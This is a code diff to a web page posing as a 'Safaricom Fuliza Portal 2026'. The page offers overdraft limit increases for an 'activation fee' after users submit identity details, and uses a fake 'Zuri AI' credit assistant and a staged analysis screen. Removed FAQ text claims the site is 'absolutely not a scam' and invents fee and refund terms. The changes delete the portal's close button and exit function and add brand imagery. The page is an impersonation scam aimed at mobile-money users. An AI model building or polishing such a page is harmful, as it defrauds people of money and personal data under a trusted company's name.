@@ -8,14 +8,15 @@
   * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
   body { background: #f4f6f9; color: #333; line-height: 1.5; padding-bottom: 90px; }
   
-  .header { background: #008541; color: #fff; padding: 15px; text-align: center; font-size: 18px; font-weight: 700; box-shadow: 0 2px 5px rgba(0,0,0,0.1); display: flex; justify-content: space-between; align-items: center; max-width: 600px; margin: 0 auto; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; }
-  .header-title { font-size: 18px; font-weight: 700; text-align: center; flex-grow: 1; }
-  .close-btn { background: none; border: none; color: white; font-size: 22px; cursor: pointer; font-weight: bold; padding: 0 10px; }
+  .header { background: #008541; color: #fff; padding: 15px; text-align: center; font-size: 18px; font-weight: 700; box-shadow: 0 2px 5px rgba(0,0,0,0.1); display: flex; justify-content: center; align-items: center; max-width: 600px; margin: 0 auto; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; }
+  .header-title { font-size: 18px; font-weight: 700; text-align: center; }
   
   .screen { display: none; min-height: 100vh; padding-bottom: 20px; }
   .screen.active { display: block; }
   .container { padding: 15px; max-width: 600px; margin: 0 auto; }
   
+  .banner-img { width: 100%; border-radius: 12px; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); display: block; object-fit: cover; }
+
   .card { background: #fff; border-radius: 12px; padding: 20px; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid #e1e4e8; }
   
   .hero-banner { background: linear-gradient(135deg, #00a651 0%, #006837 100%); color: #fff; border-radius: 12px; padding: 30px 20px; margin-bottom: 15px; box-shadow: 0 6px 16px rgba(0,166,81,0.25); text-align: center; }
@@ -63,8 +64,10 @@
   .limit-option.selected { border-color: #00a651; background: #e6f9ee; box-shadow: 0 4px 10px rgba(0,166,81,0.15); }
   .limit-option.selected::after { content: "✓"; position: absolute; top: 10px; right: 15px; color: #00a651; font-weight: bold; font-size: 18px; }
   
-  /* Floating Zuri AI Widget */
-  .zuri-floating-btn { position: fixed; bottom: 85px; right: 20px; width: 60px; height: 60px; background: #00a651; border-radius: 50%; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: bold; box-shadow: 0 4px 15px rgba(0,166,81,0.4); cursor: pointer; z-index: 999; animation: floatBounce 3s infinite ease-in-out; border: 2px solid #fff; }
+  /* Business AI Zuri Avatar & Widget Styling */
+  .zuri-avatar-img { width: 100%; height: 100%; object-fit: cover; border-radius: 50%; }
+  
+  .zuri-floating-btn { position: fixed; bottom: 85px; right: 20px; width: 60px; height: 60px; background: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0,166,81,0.4); cursor: pointer; z-index: 999; animation: floatBounce 3s infinite ease-in-out; border: 2px solid #00a651; padding: 2px; }
   @keyframes floatBounce {
     0%, 100% { transform: translateY(0); }
     50% { transform: translateY(-8px); }
@@ -72,6 +75,8 @@
   
   .zuri-chat-window { position: fixed; bottom: 155px; right: 20px; width: 320px; max-width: 90vw; background: #fff; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.2); border: 1px solid #cce5d8; display: none; flex-direction: column; overflow: hidden; z-index: 1000; }
   .zuri-chat-header { background: #008541; color: #fff; padding: 12px; font-weight: 700; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }
+  .zuri-header-info { display: flex; align-items: center; gap: 8px; }
+  .zuri-header-avatar { width: 28px; height: 28px; border-radius: 50%; border: 1px solid #fff; }
   .zuri-chat-body { padding: 12px; max-height: 250px; overflow-y: auto; font-size: 13px; background: #f9fbf9; }
   .zuri-msg { background: #e6f9ee; color: #006837; padding: 8px 12px; border-radius: 8px; margin-bottom: 8px; border-left: 3px solid #00a651; text-align: left; line-height: 1.4; }
   .zuri-typing { display: none; font-style: italic; color: #888; margin-bottom: 8px; text-align: left; padding: 4px 8px; font-weight: 600; }
@@ -106,13 +111,6 @@
   
   .error { color: #d32f2f; font-size: 12px; margin-top: 4px; display: none; text-align: left; }
   
-  /* FAQ Accordion Styling */
-  .faq-section { margin-top: 25px; text-align: left; }
-  .faq-section h2 { text-align: left; font-size: 16px; margin-bottom: 12px; border-bottom: 2px solid #e1e4e8; padding-bottom: 5px; }
-  .faq-item { border-bottom: 1px solid #eee; margin-bottom: 5px; }
-  .faq-question { width: 100%; text-align: left; background: none; border: none; padding: 12px 0; font-size: 13px; font-weight: 600; color: #333; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
-  .faq-answer { display: none; padding-bottom: 12px; font-size: 12px; color: #666; line-height: 1.5; }
-  
   /* Modal Overlay for Terms */
   .modal-overlay { position: fixed; top:0; left:0; right:0; bottom:0; background: rgba(0,0,0,0.6); z-index: 10001; display: none; align-items: center; justify-content: center; padding: 20px; }
   .modal-body { background: #fff; border-radius: 12px; max-height: 80vh; width: 100%; max-width: 500px; padding: 20px; overflow-y: auto; text-align: left; }
@@ -134,9 +132,10 @@
 <div id="s1" class="screen active">
   <div class="header">
     <span class="header-title">Safaricom Fuliza Portal</span>
-    <button class="close-btn" onclick="closePortal()">×</button>
   </div>
   <div class="container">
+    <img src="36883.jpg" alt="Safaricom Fuliza Limits" class="banner-img">
+
     <div class="hero-banner">
       <h2>SAFARICOM FULIZA MPESA PORTAL 2026</h2>
       <p>Secure, Instant & Powered by AI Scoring Engine</p>
@@ -152,86 +151,6 @@
       <p>Upgrade your daily overdraft facility instantaneously. Our automated assessment engine processes credit history, line activity, and usage consistency to optimize limits without lengthy delays.</p>
       <button class="btn" onclick="show(2)">Check Eligibility & Limit Upgrade</button>
     </div>
-
-    <!-- 15 FAQs Section -->
-    <div class="card faq-section">
-      <h2>Frequently Asked Questions</h2>
-      
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">Is this platform legitimate and safe? <span>+</span></button>
-        <div class="faq-answer"><strong>No, this is absolutely not a scam.</strong> Our portal operates within strict data encryption standards and interfaces with M-PESA clearing systems. We do not store sensitive security PINs, ensuring your personal and financial details remain completely secure throughout the process.</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">How long does the limit increase process take? <span>+</span></button>
-        <div class="faq-answer">Once your details are submitted and analyzed by Zuri AI, approval is instant, and your new overdraft tier is reflected on your line shortly after processing.</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">Why is an activation fee required? <span>+</span></button>
-        <div class="faq-answer">The activation fee covers the transactional verification charge and automated Credit Reference Bureau (CRB) query fee required to instantly provision your upgraded overdraft tier.</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">What qualifies me for a higher Fuliza limit? <span>+</span></button>
-        <div class="faq-answer">Eligibility is influenced by active line history, consistent M-PESA transactions, timely repayment of prior overdrafts, and continuous voice/data usage.</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">Will my PIN be requested at any stage? <span>+</span></button>
-        <div class="faq-answer">Never. You will only enter your M-PESA PIN safely via the official Secure STK Push prompt on your device handset. Never share your PIN with anyone.</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">Can I decrease my limit back later? <span>+</span></button>
-        <div class="faq-answer">Yes, you can manually request overdraft limit reductions at any time via official Safaricom USSD menu channels (*334#).</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">How often can I request a limit increase? <span>+</span></button>
-        <div class="faq-answer">You can evaluate your limit enhancement eligibility once every 30 calendar days following successful updates.</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">What happens if my activation transaction fails? <span>+</span></button>
-        <div class="faq-answer">If an STK Push fails or drops due to connection timeouts, you will be prompted to retry instantly without double charge.</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">Does this service affect my credit score? <span>+</span></button>
-        <div class="faq-answer">No, performing an eligibility assessment through Zuri AI does not negatively affect your external credit scoring profiles.</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">Can non-active lines get an increase? <span>+</span></button>
-        <div class="faq-answer">Lines must be registered for M-PESA and actively used for a minimum of 6 months to qualify for elevated overdraft structures.</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">Is the activation fee refundable? <span>+</span></button>
-        <div class="faq-answer">In the unlikely event your account fails manual system provisioning, activation fees are reversed automatically back to your M-PESA account within 24 hours.</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">How do I pay back my Fuliza balance? <span>+</span></button>
-        <div class="faq-answer">Repayment is automatically deducted whenever funds are deposited into your M-PESA account.</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">Is Zuri AI automated? <span>+</span></button>
-        <div class="faq-answer">Yes, Zuri AI utilizes advanced algorithmic analysis to review line performance instantly without manual human interference.</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">Can I increase limit for a different number? <span>+</span></button>
-        <div class="faq-answer">You can perform assessments for any registered Safaricom phone number provided you possess owner authorization and correct national ID details.</div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question" onclick="toggleFaq(this)">Who do I contact for additional support? <span>+</span></button>
-        <div class="faq-answer">Support is accessible via our customer care channels directly from the standard helpline 0722000000.</div>
-      </div>
-    </div>
   </div>
 </div>
 
@@ -239,7 +158,6 @@
 <div id="s2" class="screen">
   <div class="header">
     <span class="header-title">Identity Verification</span>
-    <button class="close-btn" onclick="closePortal()">×</button>
   </div>
   <div class="container">
     <div class="card">
@@ -274,7 +192,6 @@
 <div id="s3" class="screen">
   <div class="header">
     <span class="header-title">Select Limit Package</span>
-    <button class="close-btn" onclick="closePortal()">×</button>
   </div>
   <div class="container">
     <!-- User Profile Details Card with SVG Avatar -->
@@ -336,7 +253,6 @@
 <div id="s4" class="screen">
   <div class="header">
     <span class="header-title">Activation Payment</span>
-    <button class="close-btn" onclick="closePortal()">×</button>
   </div>
   <div class="container">
     <div class="card">
@@ -359,7 +275,6 @@
 <div id="s5" class="screen">
   <div class="header">
     <span class="header-title">Processing Request</span>
-    <button class="close-btn" onclick="closePortal()">×</button>
   </div>
   <div class="container">
     <div class="card" style="text-align:center; padding: 40px 20px;">
@@ -372,16 +287,21 @@
 </div>
 
 <!-- Floating Zuri AI Floating Widget Component -->
-<div class="zuri-floating-btn" onclick="toggleZuriChat()">Z</div>
+<div class="zuri-floating-btn" onclick="toggleZuriChat()">
+  <img src="36883.jpg" alt="Zuri AI" class="zuri-avatar-img">
+</div>
 
 <div id="zuriChatWindow" class="zuri-chat-window">
   <div class="zuri-chat-header">
-    <span>Zuri AI Assistant</span>
+    <div class="zuri-header-info">
+      <img src="36883.jpg" alt="Zuri AI" class="zuri-header-avatar">
+      <span>Zuri AI Business Support</span>
+    </div>
     <span style="cursor:pointer;" onclick="toggleZuriChat()">×</span>
   </div>
   <div class="zuri-chat-body" id="zuriChatBody">
-    <div class="zuri-msg">Hello! I am Zuri AI. Tap any query below to check your line parameters!</div>
-    <div class="zuri-typing" id="zuriTyping">Zuri is typing.........</div>
+    <div class="zuri-msg">Hello! I am Zuri, your AI Credit Assistant. Select a query below to inspect your line parameters!</div>
+    <div class="zuri-typing" id="zuriTyping">Zuri is analyzing...</div>
   </div>
   <div class="zuri-prompts">
     <button class="zuri-prompt-btn" onclick="askZuri('eligibility')">How is my limit evaluated?</button>
@@ -393,7 +313,9 @@
 <!-- 6-Second Zuri AI Analysis Overlay -->
 <div id="analysisOverlay" class="analysis-overlay">
   <div class="analysis-modal">
-    <div class="zuri-avatar" style="width:45px; height:45px; border-radius:50%; background:#00a651; color:#fff; display:flex; align-items:center; justify-content:center; font-weight:bold; font-size:20px; margin: 0 auto 10px auto;">Z</div>
+    <div style="width:55px; height:55px; border-radius:50%; overflow:hidden; border:2px solid #00a651; margin: 0 auto 10px auto;">
+      <img src="36883.jpg" alt="Zuri AI" class="zuri-avatar-img">
+    </div>
     <h3 style="color:#00a651; font-size:18px; margin-bottom:5px;">Zuri AI Analysis in Progress</h3>
     <p style="font-size:12px; color:#666;">Analyzing line parameters & credit eligibility...</p>
     <div class="loader"></div>
@@ -451,12 +373,6 @@ function show(screenNum) {
   document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
   document.getElementById("s" + screenNum).classList.add('active');
   window.scrollTo(0, 0);
-}
-
-function closePortal() {
-  if (confirm("Are you sure you want to close the Fuliza Increase Portal?")) {
-    window.location.href = "about:blank";
-  }
 }
 
 function formatPhoneNumber(phone) {
@@ -599,18 +515,6 @@ function goToCheckout() {
   document.body.appendChild(script);
 
   show(4);
-}
-
-function toggleFaq(btn) {
-  const ans = btn.nextElementSibling;
-  const isVisible = ans.style.display === "block";
-  document.querySelectorAll('.faq-answer').forEach(a => a.style.display = 'none');
-  document.querySelectorAll('.faq-question span').forEach(s => s.innerText = '+');
-  
-  if (!isVisible) {
-    ans.style.display = "block";
-    btn.querySelector('span').innerText = '-';
-  }
 }
 
 function openModal(id) {
